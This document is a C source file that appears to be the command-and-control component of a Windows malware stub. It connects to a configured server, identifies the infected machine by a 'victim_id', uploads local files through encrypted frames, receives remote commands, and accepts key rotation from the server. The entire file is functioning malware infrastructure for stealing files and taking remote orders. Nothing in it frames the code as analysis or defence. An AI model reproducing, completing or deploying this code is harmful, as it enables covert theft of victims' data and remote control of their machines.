/* builder/stub/c2.c */
#define WIN32_LEAN_AND_MEAN
#include "c2.h"
#include "util.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#pragma comment(lib, "ws2_32.lib")

/* frame: [4B len BE][1B type][12B iv][16B tag][payload] */
#define TYPE_HB   0x01
#define TYPE_FILE 0x02
#define TYPE_CMD  0x03
#define TYPE_ROT  0x04

static int send_all(SOCKET s, const void *buf, int n) {
    const char *p = (const char*)buf;
    while (n > 0) {
        int r = send(s, p, n, 0);
        if (r <= 0) return -1;
        p += r; n -= r;
    }
    return 0;
}

static int recv_all(SOCKET s, void *buf, int n) {
    char *p = (char*)buf;
    while (n > 0) {
        int r = recv(s, p, n, 0);
        if (r <= 0) return -1;
        p += r; n -= r;
    }
    return 0;
}

static int frame_send(SOCKET s, unsigned char type, crypto_ctx *c,
                      const unsigned char *pt, size_t pt_len) {
    unsigned char iv[12], tag[16];
    unsigned char ct[65536];
    size_t ct_len = sizeof(ct);
    if (pt_len > sizeof(ct)) return -1;
    if (crypto_seal(c, pt, pt_len, ct, &ct_len, tag, iv) < 0) return -1;

    unsigned char hdr[5];
    uint32_t total = (uint32_t)(1 + 12 + 16 + ct_len);
    hdr[0] = (total >> 24) & 0xFF;
    hdr[1] = (total >> 16) & 0xFF;
    hdr[2] = (total >>  8) & 0xFF;
    hdr[3] = (total      ) & 0xFF;
    hdr[4] = type;

    if (send_all(s, hdr, 5) < 0) return -1;
    if (send_all(s, iv, 12) < 0) return -1;
    if (send_all(s, tag, 16) < 0) return -1;
    if (send_all(s, ct, (int)ct_len) < 0) return -1;
    return 0;
}

int c2_connect(c2_conn *c) {
    WSADATA w; WSAStartup(MAKEWORD(2,2), &w);
    struct addrinfo hints = {0}, *res = NULL;
    hints.ai_socktype = SOCK_STREAM;
    char port[8]; snprintf(port, sizeof(port), "%u", c->port);
    if (getaddrinfo(c->host, port, &hints, &res) != 0) return -1;

    SOCKET s = INVALID_SOCKET;
    for (struct addrinfo *p = res; p; p = p->ai_next) {
        s = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (s == INVALID_SOCKET) continue;
        if (connect(s, p->ai_addr, (int)p->ai_addrlen) == 0) break;
        closesocket(s); s = INVALID_SOCKET;
    }
    freeaddrinfo(res);
    if (s == INVALID_SOCKET) return -1;
    c->sock = (void*)(uintptr_t)s;
    return 0;
}

int c2_handshake(c2_conn *c) {
    SOCKET s = (SOCKET)(uintptr_t)c->sock;
    /* plaintext hello: "BV1 <token> <victim_id>\n" */
    char hello[128];
    int n = snprintf(hello, sizeof(hello), "BV1 %s %s\n", c->token, c->victim_id);
    if (send_all(s, hello, n) < 0) return -1;

    char ack[16];
    if (recv_all(s, ack, 4) < 0) return -1;
    ack[4] = 0;
    return strcmp(ack, "OK\r\n") == 0 ? 0 : -1;
}

int c2_send_file(c2_conn *c, const char *local_path) {
    SOCKET s = (SOCKET)(uintptr_t)c->sock;
    FILE *f = fopen(local_path, "rb");
    if (!f) return -1;
    fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
    if (sz <= 0 || sz > (8*1024*1024)) { fclose(f); return -1; }

    unsigned char *buf = (unsigned char*)malloc(sz);
    fread(buf, 1, sz, f); fclose(f);

    /* payload: [2B path_len][path][data] */
    size_t pl = strlen(local_path);
    size_t total = 2 + pl + sz;
    unsigned char *payload = (unsigned char*)malloc(total);
    payload[0] = (pl >> 8) & 0xFF; payload[1] = pl & 0xFF;
    memcpy(payload + 2, local_path, pl);
    memcpy(payload + 2 + pl, buf, sz);

    int r = frame_send(s, TYPE_FILE, c->crypto, payload, total);
    free(payload); free(buf);
    return r;
}

int c2_recv_cmd(c2_conn *c, char *buf, size_t cap) {
    SOCKET s = (SOCKET)(uintptr_t)c->sock;
    unsigned char hdr[5];
    if (recv_all(s, hdr, 5) < 0) return -1;
    uint32_t total = ((uint32_t)hdr[0]<<24)|((uint32_t)hdr[1]<<16)|
                     ((uint32_t)hdr[2]<<8)|hdr[3];
    unsigned char type = hdr[4];
    if (total < 28 || total > 65536) return -1;

    unsigned char iv[12], tag[16], ct[65536];
    if (recv_all(s, iv, 12) < 0) return -1;
    if (recv_all(s, tag, 16) < 0) return -1;
    size_t ct_len = total - 28;
    if (recv_all(s, ct, (int)ct_len) < 0) return -1;

    unsigned char pt[65536]; size_t pt_len = sizeof(pt);
    if (crypto_open(c->crypto, iv, ct, ct_len, tag, pt, &pt_len) < 0) return -1;

    if (type == TYPE_ROT && pt_len == 32) {
        memcpy(c->crypto->key, pt, 32);
        return 1;
    }
    if (pt_len >= cap) pt_len = cap - 1;
    memcpy(buf, pt, pt_len); buf[pt_len] = 0;
    return (int)pt_len;
}

void c2_close(c2_conn *c) {
    if (c->sock) { closesocket((SOCKET)(uintptr_t)c->sock); c->sock = NULL; }
}
